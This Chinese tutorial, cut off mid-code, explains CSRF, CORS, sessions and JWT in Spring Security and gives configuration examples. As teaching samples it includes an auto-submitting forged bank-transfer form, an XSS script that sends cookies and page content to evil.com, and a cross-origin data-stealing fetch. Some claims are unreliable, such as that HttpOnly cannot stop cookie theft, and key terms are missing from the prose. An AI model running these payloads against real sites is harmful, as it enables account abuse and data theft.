---
title: "CSRF-CORS与会话安全"
description: "这些概念经常同时出现，但解决的问题完全不同。如果边界不清，配置很容易一通乱关，最后系统\"能跑了\"，安全边界却没了。"
keywords: []
category: "Java"
tags: [Java, SpringSecurity]
---


# CSRF、CORS 与会话安全

Spring Security 讨论到后面，很容易混进一堆名词：

- 
- 
- Session
- Cookie

这些概念经常同时出现，但解决的问题完全不同。如果边界不清，配置很容易一通乱关，最后系统"能跑了"，安全边界却没了。

## CSRF 解决什么问题

（Cross-Site Request Forgery,跨站请求伪造）针对的是这样一种风险：

- 浏览器已经自动带上登录态
- 用户在不知情时被诱导访问恶意页面
- 恶意页面借用户身份发起请求

所以它和"是不是前后端分离"并没有直接等号关系，核心看的是：

- 认证凭证是否会被浏览器自动携带

如果会自动携带，例如基于 Cookie 的 Session 模式，就要特别重视 。

### CSRF 攻击原理详解

**攻击场景：**
```
1. 用户登录了银行网站 bank.com
   → 浏览器保存了 Cookie (session_id=xxx)

2. 用户在新标签页访问恶意网站 evil.com
   → 页面中包含恶意代码

3. 恶意代码发起请求到 bank.com
   <form action="https://bank.com/transfer" method="POST">
     <input type="hidden" name="to" value="attacker">
     <input type="hidden" name="amount" value="10000">
   </form>
   <script>document.forms[0].submit();</script>

4. 浏览器自动带上 bank.com 的 Cookie
   → 银行服务器认为是合法请求
   → 转账成功!
```

**关键点：**
- 浏览器会自动携带目标域名的 Cookie
- 用户完全不知情
- 目标网站无法区分是用户主动发起还是被诱导发起

### CSRF 攻击条件

CSRF 攻击成功需要满足以下条件：

1. **目标网站使用 Cookie 认证**
   - Session Cookie
   - 长期有效的自动登录 Cookie
   - 其他浏览器自动携带的凭证

2. **请求可被伪造**
   - GET 请求更容易被伪造（URL 直接触发）
   - POST 请求也可通过表单自动提交伪造
   - 需要攻击者知道请求的格式和参数

3. **用户已登录目标网站**
   - Cookie 有效期内
   - 未过期或被撤销

4. **用户访问了恶意页面**
   - 点击了钓鱼链接
   - 访问了被注入恶意代码的合法网站

### CSRF 与 XSS 的区别

| 特性 | CSRF | XSS |
|---|---|---|
| 攻击方式 | 伪造请求 | 注入恶意脚本 |
| 利用用户身份 | 是 | 是 |
| 能否读取数据 | 否 | 能 |
| 能否窃取 Cookie | 否 | 能（HttpOnly 也无法防止） |
| 防护措施 | CSRF Token | 输入输出转义、CSP |

**CSRF 示例：**
```html
<!-- 恶意网站 evil.com -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
<!-- 无法读取响应内容 -->
```

**XSS 示例：**
```html
<!-- 注入到目标网站的恶意脚本 -->
<script>
  // 可以读取 Cookie
  var cookie = document.cookie;
  
  // 可以读取页面内容
  var content = document.body.innerHTML;
  
  // 发送给攻击者
  fetch('https://evil.com/steal?data=' + encodeURIComponent(content));
</script>
```

## CORS 解决什么问题

（Cross-Origin Resource Sharing,跨源资源共享）解决的是浏览器跨域访问限制问题。它关注的是：

- 哪些来源可以访问
- 哪些方法、头允许跨域
- 是否允许携带凭证

它不是安全认证机制，也不是权限控制机制。

可以简单记为：

-  是防伪造请求
-  是浏览器跨域访问规则

### 同源策略（Same-Origin Policy）

**什么是同源：**
两个 URL 同源需要满足三个条件：
- 协议（Protocol）相同
- 域名（Domain）相同
- 端口（Port）相同

**示例：**
```
当前页面: https://www.example.com/page

同源:
√ https://www.example.com/api
√ https://www.example.com:443/api (默认端口)
√ https://www.example.com/other/page

不同源:
× http://www.example.com/api (协议不同)
× https://api.example.com (域名不同)
× https://www.example.com:8080 (端口不同)
× https://sub.example.com (子域名不同)
```

**同源策略的限制：**
- AJAX 请求：不能发送跨域请求
- DOM 操作：不能操作跨域 iframe
- Cookie:不能读取跨域 Cookie
- LocalStorage:不能访问跨域存储

### CORS 工作原理

**简单请求（Simple Request）:**

满足以下条件的请求不会触发预检：

```
请求方法:
- GET
- POST
- HEAD

请求头(仅允许):
- Accept
- Accept-Language
- Content-Language
- Content-Type (仅限 application/x-www-form-urlencoded、multipart/form-data、text/plain)
```

**简单请求流程：**
```
1. 浏览器直接发送请求
   GET https://api.example.com/users
   Origin: https://www.example.com

2. 服务器响应
   Access-Control-Allow-Origin: https://www.example.com
   Access-Control-Allow-Credentials: true

3. 浏览器检查响应头
   - 如果 Origin 匹配,允许前端读取响应
   - 如果不匹配,报错
```

**预检请求（Preflight Request）:**

不符合简单请求条件的请求会先发送 OPTIONS 预检：

```
1. 浏览器发送预检请求
   OPTIONS https://api.example.com/users
   Origin: https://www.example.com
   Access-Control-Request-Method: POST
   Access-Control-Request-Headers: Content-Type, Authorization

2. 服务器响应预检
   Access-Control-Allow-Origin: https://www.example.com
   Access-Control-Allow-Methods: POST, GET, PUT, DELETE
   Access-Control-Allow-Headers: Content-Type, Authorization
   Access-Control-Max-Age: 86400

3. 浏览器发送实际请求
   POST https://api.example.com/users
   Origin: https://www.example.com
   Content-Type: application/json
   Authorization: Bearer xxx

4. 服务器响应实际请求
   Access-Control-Allow-Origin: https://www.example.com
```

### CORS 响应头详解

| 响应头 | 说明 | 示例 |
|---|---|---|
| Access-Control-Allow-Origin | 允许的源 |  或  |
| Access-Control-Allow-Methods | 允许的方法 |  |
| Access-Control-Allow-Headers | 允许的请求头 |  |
| Access-Control-Allow-Credentials | 是否允许携带凭证 |  |
| Access-Control-Max-Age | 预检请求缓存时间（秒） |  |
| Access-Control-Expose-Headers | 暴露给前端的响应头 |  |

**重要限制：**
```java
// × 错误:同时使用通配符和凭证
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
// 浏览器会报错

// √ 正确:指定源 + 凭证
Access-Control-Allow-Origin: https://www.example.com
Access-Control-Allow-Credentials: true
```

## Session 和无状态认证的差异

### Session 模式

传统 Session 模式下：

- 服务端保存登录态
- 浏览器自动带 Cookie

这种模式下，如果没有额外保护，就天然更容易引出  风险。

#### Session 工作原理

```
1. 用户登录
   POST /login
   Body: { username, password }
     ↓
2. 服务端验证
   - 检查用户名密码
   - 创建 Session
   - 生成 Session ID
     ↓
3. 返回 Cookie
   Set-Cookie: SESSION=NjUyZDk...; Path=/; HttpOnly
     ↓
4. 后续请求
   GET /api/user
   Cookie: SESSION=NjUyZDk...
     ↓
5. 服务端验证 Session
   - 根据 Session ID 查找 Session
   - 检查是否过期
   - 获取用户信息
```

#### Session 存储方案

**1. 内存存储（In-Memory）**
```java
@Bean
public SessionRegistry sessionRegistry() {
    return new SessionRegistryImpl();
}
```

优点：
- √ 实现简单
- √ 性能好

缺点：
- × 重启丢失
- × 无法集群共享
- × 占用应用内存

**2. 数据库存储**
```java
@Bean
public FindByIndexNameSessionRepository<?> sessionRepository() {
    return new JdbcIndexedSessionRepository(dataSource, "SPRING_SESSION");
}

// 需要创建表
CREATE TABLE SPRING_SESSION (
    PRIMARY_ID CHAR(36) NOT NULL,
    SESSION_ID CHAR(36) NOT NULL,
    CREATION_TIME BIGINT NOT NULL,
    LAST_ACCESS_TIME BIGINT NOT NULL,
    MAX_INACTIVE_INTERVAL INT NOT NULL,
    EXPIRY_TIME BIGINT NOT NULL,
    PRINCIPAL_NAME VARCHAR(100),
    CONSTRAINT SPRING_SESSION_PK PRIMARY KEY (PRIMARY_ID)
);
```

优点：
- √ 持久化
- √ 可查询管理
- √ 集群共享

缺点：
- × 性能较低
- × 需要数据库

**3. Redis 存储（推荐）**
```java
@Bean
public RedisIndexedSessionRepository sessionRepository(
        RedisTemplate<Object, Object> redisTemplate) {
    return new RedisIndexedSessionRepository(redisTemplate);
}
```

优点：
- √ 性能好
- √ 支持集群
- √ 自动过期
- √ 支持分布式

缺点：
- × 依赖 Redis

#### Session 配置示例

```java
@Configuration
@EnableWebSecurity
public class SessionSecurityConfig {
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) 
            throws Exception {
        http
            .authorizeHttpRequests(authz -> authz
                .anyRequest().authenticated()
            )
            .formLogin(form -> form
                .loginPage("/login")
                .permitAll()
            )
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)
                .maximumSessions(1)  // 单设备登录
                .maxSessionsPreventsLogin(false)  // 踢掉旧登录
                .sessionRegistry(sessionRegistry())
            )
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            );
        
        return http.build();
    }
    
    @Bean
    public SessionRegistry sessionRegistry() {
        return new SessionRegistryImpl();
    }
}
```

### Token / JWT 模式

JWT 或其他 Token 模式下：

- 服务端更偏无状态
- Token 往往由前端主动放进请求头

这种模式下，浏览器不会像 Cookie 那样默认自动附带所有凭证，因此  风险讨论通常会弱很多，但并不代表没有其他安全问题。

#### JWT 认证流程

```
1. 用户登录
   POST /auth/login
   Body: { username, password }
     ↓
2. 服务端验证
   - 检查用户名密码
   - 生成 JWT
   - 返回 Token
     ↓
3. 前端存储 Token
   - 内存
   - HttpOnly Cookie
   - localStorage(不推荐)
     ↓
4. 后续请求
   GET /api/user
   Authorization: Bearer eyJhbGciOi...
     ↓
5. 服务端验证 JWT
   - 解析 Token
   - 验证签名
   - 检查过期
   - 提取用户信息
```

#### JWT 配置示例

```java
@Configuration
@EnableWebSecurity
public class JwtSecurityConfig {
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) 
            throws Exception {
        http
            .csrf(csrf -> csrf.disable())  // JWT 模式通常禁用 CSRF
            .sessionManagement(session -> 
                session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .authorizeHttpRequests(authz -> authz
                .requestMatchers("/auth/**").permitAll()
                .anyRequest().authenticated()
            )
            .addFilterBefore(jwtAuthenticationFilter(), 
                UsernamePasswordAuthenticationFilter.class);
        
        return http.build();
    }
}
```

#### Session vs JWT 对比

| 特性 | Session | JWT |
|---|---|---|
| 存储位置 | 服务端 | 客户端 |
| 状态 | 有状态 | 无状态 |
| 扩展性 | 需要共享存储 | 天然支持分布式 |
| 注销 | 立即生效 | 需要黑名单 |
| CSRF 风险 | 高（浏览器自动带 Cookie） | 低（手动添加到请求头） |
| 性能 | 每次需查询存储 | 自包含，无需查询 |
| 安全性 | 依赖 Cookie 安全 | 依赖 Token 保护 |
| 体积 | Cookie 小 | Token 较大 |

### 为什么 Token 模式 CSRF 风险较低？

**关键原因：**
```javascript
// Cookie 模式:浏览器自动携带
fetch('https://api.example.com/transfer', {
  method: 'POST',
  // Cookie 自动带上,无需手动设置
});
// √ 恶意网站也可以发起请求,浏览器会自动带 Cookie

// JWT 模式:需要手动添加到请求头
fetch('https://api.example.com/transfer', {
  method: 'POST',
  headers: {
    'Authorization': 'Bearer ' + token  // 需要手动添加
  }
});
// × 恶意网站无法获取 Token,无法发起请求
```

**但需要注意：**
- 如果将 JWT 存储在 Cookie 中，仍然有 CSRF 风险
- 如果前端有 XSS 漏洞，Token 可以被窃取
- Token 泄露的影响可能更大（无法主动注销）

## 为什么 CORS 不能简单全开

很多项目为了"先让前端调通"，会直接把  配成全开放。这会带来几个问题：

- 任意来源都可访问
- 凭证携带边界不清
- 很难审计真正允许的来源

更稳妥的做法是：

- 只允许明确来源
- 只开放必要方法和头
- 凭证携带要有明确策略

### CORS 错误配置的风险

**全开放的 CORS 配置：**
```java
// × 危险配置
@Bean
public CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration configuration = new CorsConfiguration();
    configuration.setAllowedOrigins(Arrays.asList("*"));  // 所有来源
    configuration.setAllowedMethods(Arrays.asList("*"));  // 所有方法
    configuration.setAllowedHeaders(Arrays.asList("*"));  // 所有头
    configuration.setAllowCredentials(true);  // 允许凭证
    
    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/**", configuration);
    return source;
}
```

**问题：**
```
1. 任意网站都可以调用你的 API
2. 可以窃取用户敏感数据
3. 可以执行用户操作
```

**攻击示例：**
```html
<!-- 恶意网站 evil.com -->
<script>
  // 因为 CORS 全开,这个请求会成功
  fetch('https://api.example.com/user/profile', {
    credentials: 'include'  // 携带 Cookie
  })
  .then(response => response.json())
  .then(data => {
    // 窃取用户数据
    sendToAttacker(data);
  });
</script>
```

### 正确的 CORS 配置

**指定来源：**
```java
@Bean
public CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration configuration = new CorsConfiguration();
    
    // √ 明确指定允许的来源
    configuration.setAllowedOrigins(Arrays.asList(
        "https://www.example.com",
        "https://app.example.com"
    ));
    
    // √ 只开放必要的方法
    configuration.setAllowedMethods(Arrays.asList(
        "GET", "POST", "PUT", "DELETE"
    ));
    
    // √ 只开放必要的头
    configuration.setAllowedHeaders(Arrays.asList(
        "Authorization",
        "Content-Type"
    ));
    
    // √ 明确是否允许凭证
    configuration.setAllowCredentials(true);
    
    // √ 设置预检缓存时间
    configuration.setMaxAge(3600L);
    
    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/api/**", configuration);
    return source;
}
```

**动态 CORS 配置：**
```java
@Component
public class DynamicCorsFilter extends OncePerRequestFilter {
    
    @Autowired
    private AllowedOriginsService allowedOriginsService;
    
    @Override
    protected void doFilterInternal(
            HttpServletRequest request,
            HttpServletResponse response,
            FilterChain filterChain) throws ServletException, IOException {
        
        String origin = request.getHeader("Origin");
        
        // 从数据库或配置中心加载允许的来源
        if (allowedOriginsService.isAllowed(origin)) {
            response.setHeader("Access-Control-Allow-Origin", origin);
            response.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE");
            response.setHeader("Access-Control-Allow-Headers", "Authorization, Content-Type");
            response.setHeader("Access-Control-Allow-Credentials", "true");
            response.setHeader("Access-Control-Max-Age", "3600");
        }
        
        // 处理预检请求
        if ("OPTIONS".equalsIgnoreCase(request.getMethod())) {
            response.setStatus(HttpServletResponse.SC_OK);
            return;
        }
        
        filterChain.doFilter(request, response);
    }
}
```

## Spring Security CSRF 防护详解

### CSRF Token 机制

Spring Security 通过 CSRF Token 防护 CSRF 攻击：

```
1. 服务器生成 CSRF Token
   - 随机字符串
   - 绑定到 Session
   - 存储在服务端

2. 将 Token 发送给前端
   - 嵌入在表单隐藏字段
   - 或设置到 Cookie

3. 前端提交时携带 Token
   - 表单参数 _csrf
   - 或请求头 X-XSRF-TOKEN

4. 服务器验证 Token
   - 对比请求中的 Token 和 Session 中的 Token
   - 不匹配则拒绝请求
```

### CSRF Token 存储方式

#### 1. CookieCsrfTokenRepository

将 Token 存储在 Cookie 中（前端框架友好）:

```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) 
        throws Exception {
    http
        .csrf(csrf -> csrf
            .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
        );
    
    return http.build();
}
```

**工作原理：**
```
1. 服务器设置 Cookie
   Set-Cookie: XSRF-TOKEN=abc123; Path=/

2. 前端读取 Cookie 并添加到请求头
   X-XSRF-TOKEN: abc123

3. 服务器验证
```

**前端集成：**
```javascript
// Angular 自动支持 XSRF-TOKEN Cookie

// React/Vue 手动添加
import Cookies from 'js-cookie';

axios.interceptors.request.use(config => {
  const token = Cookies.get('XSRF-TOKEN');
  if (token) {
    config.headers['X-XSRF-TOKEN'] = token;
  }
  return config;
});
```

#### 2. HttpSessionCsrfTokenRepository

将 Token 存储在 Session 中（默认方式）:

```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) 
        throws Exception {
    http
        .csrf(csrf -> csrf
            .csrfTokenRepository(new HttpSessionCsrfTokenRepository())
        );
    
    return http.build();
}
```

**Thymeleaf 模板集成：**
```html
<form action="/transfer" method="POST">
  <!-- 自动添加 CSRF Token -->
  <input type="hidden" th:name="${_csrf.parameterName}" th:value="${_csrf.token}"/>
  
  <input type="text" name="to"/>
  <input type="number" name="amount"/>
  <button type="submit">转账</button>
</form>
```

### Spring Security CSRF 配置

#### 启用 CSRF 防护

```java
@Configuration
@EnableWebSecurity
public class CsrfSecurityConfig {
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) 
            throws Exception {
        http
            .authorizeHttpRequests(authz -> authz
                .anyRequest().authenticated()
            )
            .formLogin(form -> form
                .loginPage("/login")
                .permitAll()
            )
            // 启用 CSRF(默认已启用)
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
                .ignoringRequestMatchers("/api/public/**")  // 忽略某些路径
            );
        
        return http.build();
    }
}
```

#### 禁用 CSRF 防护

```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) 
        throws Exception {
    http
        .csrf(csrf -> csrf.disable());  // 仅在确认无 CSRF 风险时禁用
    
    return http.build();
}
```

**何时可以禁用：**
- √ 纯 API 服务，无 Cookie 认证
- √ JWT Token 认证，Token 不在 Cookie 中
- √ 仅允许特定来源访问

**何时不应该禁用：**
- × Session + Cookie 认证
- × 有状态服务
- × 混合 Web 应用

#### 忽略特定路径

```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) 
        throws Exception {
    http
        .csrf(csrf -> csrf
            .ignoringRequestMatchers(
                "/api/webhook/**",    // Webhook 回调
                "/api/public/**",      // 公共 API
                "/ws/**"               // WebSocket
            )
        );
    
    return http.build();
}
```

### 前端集成 CSRF Token

#### React 示例

```javascript
// axios 配置
import axios from 'axios';
import Cookies from 'js-cookie';

// 创建 axios 实例
const api = axios.create({
  baseURL: '/api',
  timeout: 10000,
  withCredentials: true  // 允许携带 Cookie
});

// 请求拦截器:添加 CSRF Token
api.interceptors.request.use(config => {
  const method = config.method?.toUpperCase();
  
  // 仅对非安全方法添加 CSRF Token
  if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(method)) {
    const token = Cookies.get('XSRF-TOKEN');
    if (token) {
      config.headers['X-XSRF-TOKEN'] = token;
    }
  }
  
  return config;
});

export default api;

// 使用
async function transferMoney(to, amount) {
  try {
    const response = await api.post('/transfer', { to, amount });
    return response.data;
  } catch (error) {
    if (error.response?.status === 403) {
      // CSRF Token 无效或过期
      console.error('CSRF token invalid');
      // 刷新页面获取新 Token
      window.location.reload();
    }
    throw error;
  }
}
```

#### Vue 示例

```javascript
// api.js
import axios from 'axios';
import Cookies from 'js-cookie';

const api = axios.create({
  baseURL: '/api',
  withCredentials: true
});

api.interceptors.request.use(config => {
  const token = Cookies.get('XSRF-TOKEN');
  if (token) {
    config.headers['X-XSRF-TOKEN'] = token;
  }
  return config;
});

export default api;

// 组件中使用
<script>
import api from '@/api';

export default {
  methods: {
    async submitForm() {
      try {
        const response = await api.post('/api/form', this.formData);
        this.$message.success('提交成功');
      } catch (error) {
        if (error.response?.status === 403) {
          this.$message.error('安全验证失败,请刷新页面重试');
        }
      }
    }
  }
}
</script>
```

## Spring Security CORS 配置详解

### 全局 CORS 配置

```java
@Configuration
@EnableWebSecurity
public class CorsSecurityConfig {
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) 
            throws Exception {
        http
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))
            .authorizeHttpRequests(authz -> authz
                .anyRequest().authenticated()
            );
        
        return http.build();
    }
    
    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration configuration = new CorsConfiguration();
        
        // 允许的来源
        configuration.setAllowedOrigins(Arrays.asList(
            "https://www.example.com",
            "https://app.example.com"
        ));
        
        // 允许的方法
        configuration.setAllowedMethods(Arrays.asList(
            "GET", "POST", "PUT", "DELETE", "OPTIONS"
        ));
        
        // 允许的请求头
        configuration.setAllowedHeaders(Arrays.asList(
            "Authorization",
            "Content-Type",
            "X-Requested-With"
        ));
        
        // 允许携带凭证
        configuration.setAllowCredentials(true);
        
        // 暴露的响应头
        configuration.setExposedHeaders(Arrays.asList(
            "X-Total-Count",
            "X-Page-Number"
        ));
        
        // 预检缓存时间
        configuration.setMaxAge(3600L);
        
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/**", configuration);
        
        return source;
    }
}
```

### 局部 CORS 配置

```java
@RestController
@RequestMapping("/api")
@CrossOrigin(
    origins = "https://www.example.com",
    methods = {RequestMethod.GET, RequestMethod.POST},
    allowedHeaders = {"Authorization", "Content-Type"},
    allowCredentials = "true",
    maxAge = 3600
)
public class ApiController {
    
    @GetMapping("/users")
    public List<User> getUsers() {
        // ...
    }
}
```

### 方法级 CORS 配置

```java
@RestController
@RequestMapping("/api")
public class ApiController {
    
    @GetMapping("/public")
    @CrossOrigin(origins = "*")  // 公共接口允许所有来源
    public String publicApi() {
        return "public";
    }
    
    @PostMapping("/private")
    @CrossOrigin(origins = "https://www.example.com")  // 私有接口限制来源
    public String privateApi() {
        return "private";
    }
}
```

### 环境相关 CORS 配置

```java
@Configuration
@EnableWebSecurity
public class CorsSecurityConfig {
    
    @Value("${cors.allowed-origins}")
    private String allowedOrigins;
    
    @Value("${cors.allow-credentials:true}")
    private boolean allowCredentials;
    
    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration configuration = new CorsConfiguration();
        
        // 从配置文件读取允许的来源
        List<String> origins = Arrays.asList(allowedOrigins.split(","));
        configuration.setAllowedOrigins(origins);
        
        configuration.setAllowedMethods(Arrays.asList("*"));
        configuration.setAllowedHeaders(Arrays.asList("*"));
        configuration.setAllowCredentials(allowCredentials);
        configuration.setMaxAge(3600L);
        
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/**", configuration);
        
        return source;
    }
}
```

```yaml
# application-dev.yml
cors:
  allowed-origins: "http://localhost:3000,http://localhost:8080"
  allow-credentials: true

# application-prod.yml
cors:
  allowed-origins: "https://www.example.com,https://app.example.com"
  allow-credentials: true
```

## 实战场景

### 场景一：前后端分离跨域调用

前端和后端域名不同，浏览器会触发跨域限制。这时需要正确配置 ,而不是简单"全开所有来源"。

**问题场景：**
```
前端: https://www.example.com
后端: https://api.example.com

请求失败:
Access to XMLHttpRequest at 'https://api.example.com/users' 
from origin 'https://www.example.com' has been blocked by CORS policy
```

**解决方案：**

```java
@Configuration
@EnableWebSecurity
public class CorsSecurityConfig {
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) 
            throws Exception {
        http
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))
            .csrf(csrf -> csrf.disable())  // JWT 模式禁用 CSRF
            .sessionManagement(session -> 
                session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .authorizeHttpRequests(authz -> authz
                .requestMatchers(HttpMethod.OPTIONS, "/**").permitAll()  // 放行预检
                .requestMatchers("/auth/**").permitAll()
                .anyRequest().authenticated()
            )
            .addFilterBefore(jwtAuthenticationFilter(), 
                UsernamePasswordAuthenticationFilter.class);
        
        return http.build();
    }
    
    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration configuration = new CorsConfiguration();
        
        // 只允许前端域名
        configuration.setAllowedOrigins(Arrays.asList(
            "https://www.example.com",
            "https://app.example.com"
        ));
        
        // 允许的方法
        configuration.setAllowedMethods(Arrays.asList(
            "GET", "POST", "PUT", "DELETE", "OPTIONS"
        ));
        
        // 允许的请求头
        configuration.setAllowedHeaders(Arrays.asList(
            "Authorization",
            "Content-Type"
        ));
        
        // 允许携带凭证(Cookie)
        configuration.setAllowCredentials(true);
        
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/**", configuration);
        
        return source;
    }
}
```

### 场景二：Session 模式的 CSRF 风险

如果浏览器自动带 Cookie,而系统又没有额外校验，就存在  风险。

**问题场景：**
```html
<!-- 恶意网站 evil.com -->
<form action="https://bank.example.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

**解决方案：**

```java
@Configuration
@EnableWebSecurity
public class CsrfSecurityConfig {
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) 
            throws Exception {
        http
            .authorizeHttpRequests(authz -> authz
                .anyRequest().authenticated()
            )
            .formLogin(form -> form
                .loginPage("/login")
                .permitAll()
            )
            // 启用 CSRF 防护
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            );
        
        return http.build();
    }
}
```

**前端防护：**
```javascript
// 每次请求添加 CSRF Token
axios.interceptors.request.use(config => {
  const token = Cookies.get('XSRF-TOKEN');
  if (token && ['POST', 'PUT', 'DELETE'].includes(config.method?.toUpperCase())) {
    config.headers['X-XSRF-TOKEN'] = token;
  }
  return config;
});
```

### 场景三：登出和会话失效治理

用户登出后，如果服务端 Session 或前端 Token 仍然有效，就会出现"看起来退出了，其实还能访问"的边界问题。

**问题场景：**
```
1. 用户点击登出
2. 前端清除 Token
3. 但 Token 仍然有效
4. 攻击者获取 Token 后仍可访问
```

**Session 模式解决方案：**

```java
@RestController
@RequestMapping("/auth")
public class AuthController {
    
    @PostMapping("/logout")
    public ResponseEntity<?> logout(HttpServletRequest request, 
                                   HttpServletResponse response) {
        // 1. 使 Session 失效
        request.getSession().invalidate();
        
        // 2. 清除 Remember-Me Cookie
        CookieClearingLogoutHandler logoutHandler = 
            new CookieClearingLogoutHandler("JSESSIONID", "remember-me");
        logoutHandler.logout(request, response, null);
        
        // 3. 清除 SecurityContext
        SecurityContextHolder.clearContext();
        
        return ResponseEntity.ok().build();
    }
}
```

**JWT 模式解决方案：**

```java
@Service
public class TokenBlacklistService {
    
    @Autowired
    private RedisTemplate<String, String> redisTemplate;
    
    // 将 Token 加入黑名单
    public void addToBlacklist(String token, long expirationTime) {
        String key = "blacklist:" + token;
        long ttl = expirationTime - System.currentTimeMillis();
        
        if (ttl > 0) {
            redisTemplate.opsForValue().set(
                key, "revoked", 
                ttl, TimeUnit.MILLISECONDS
            );
        }
    }
    
    // 检查 Token 是否在黑名单中
    public boolean isBlacklisted(String token) {
        String key = "blacklist:" + token;
        return Boolean.TRUE.equals(redisTemplate.hasKey(key));
    }
}

// JWT 过滤器中检查黑名单
public class JwtAuthenticationFilter extends OncePerRequestFilter {
    
    @Autowired
    private TokenBlacklistService blacklistService;
    
    @Override
    protected void doFilterInternal(...) {
        String token = getJwtFromRequest(request);
        
        if (token != null) {
            // 检查黑名单
            if (blacklistService.isBlacklisted(token)) {
                response.sendError(401, "Token revoked");
                return;
            }
            
            // 验证 Token
            // ...
        }
        
        filterChain.doFilter(request, response);
    }
}

// 登出时将 Token 加入黑名单
@PostMapping("/logout")
public ResponseEntity<?> logout(@RequestHeader("Authorization") String authHeader) {
    String token = authHeader.replace("Bearer ", "");
    
    // 解析 Token 获取过期时间
    Claims claims = jwtTokenProvider.parseToken(token);
    long expirationTime = claims.getExpiration().getTime();
    
    // 加入黑名单
    tokenBlacklistService.addToBlacklist(token, expirationTime);
    
    return ResponseEntity.ok().build();
}
```

### 场景四：多子域名 CORS 配置

**场景：**
```
主域名: example.com
子域名:
- www.example.com (官网)
- app.example.com (应用)
- api.example.com (API)
```

**配置方案：**

```java
@Bean
public CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration configuration = new CorsConfiguration();
    
    // 允许所有子域名
    configuration.setAllowedOriginPatterns(Arrays.asList(
        "https://*.example.com"  // 通配符匹配所有子域名
    ));
    
    configuration.setAllowedMethods(Arrays.asList("*"));
    configuration.setAllowedHeaders(Arrays.asList("*"));
    configuration.setAllowCredentials(true);
    
    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/**", configuration);
    
    return source;
}
```

**或者使用正则匹配：**

```java
@Component
public class RegexCorsFilter extends OncePerRequestFilter {
    
    @Override
    protected void doFilterInternal(
            HttpServletRequest request,
            HttpServletResponse response,
            FilterChain filterChain) throws ServletException, IOException {
        
        String origin = request.getHeader("Origin");
        
        // 使用正则匹配子域名
        if (origin != null && origin.matches("https://[a-z0-9-]+\\.example\\.com")) {
            response.setHeader("Access-Control-Allow-Origin", origin);
            response.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE");
            response.setHeader("Access-Control-Allow-Headers", "*");
            response.setHeader("Access-Control-Allow-Credentials", "true");
        }
        
        if ("OPTIONS".equalsIgnoreCase(request.getMethod())) {
            response.setStatus(HttpServletResponse.SC_OK);
            return;
        }
        
        filterChain.doFilter(request, response);
    }
}
```

## Spring Security 中为什么经常会看到关掉 CSRF

很多前后端分离项目会这样写：

```java
http.csrf(csrf -> csrf.disable());
```

这样做不是说  不重要，而通常是因为：

- 项目不依赖浏览器自动携带 Session Cookie
- 客户端通过请求头主动携带 Token

在这种前提下， 风险模型已经变化，所以很多项目会选择关闭默认  防护。

但如果你仍然使用：

- Session
- 浏览器自动带 Cookie

那就不能草率地直接关掉它。

### CSRF 防护决策树

```
是否使用 Cookie 认证?
├─ 否 → 可以禁用 CSRF
│   └─ JWT Token 在请求头中
│
└─ 是 → 需要启用 CSRF 防护
    ├─ 表单提交 → 使用 HttpSessionCsrfTokenRepository
    │
    └─ AJAX/API → 使用 CookieCsrfTokenRepository
        └─ 前端读取 Cookie 并添加到请求头
```

### 混合模式的安全配置

有些应用同时支持 Session 和 JWT:

```java
@Configuration
@EnableWebSecurity
public class MixedSecurityConfig {
    
    @Bean
    @Order(1)
    public SecurityFilterChain apiSecurityFilterChain(HttpSecurity http) 
            throws Exception {
        http
            .securityMatcher("/api/**")
            .csrf(csrf -> csrf.disable())  // API 禁用 CSRF
            .sessionManagement(session -> 
                session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .authorizeHttpRequests(authz -> authz
                .anyRequest().authenticated()
            )
            .addFilterBefore(jwtAuthenticationFilter(), 
                UsernamePasswordAuthenticationFilter.class);
        
        return http.build();
    }
    
    @Bean
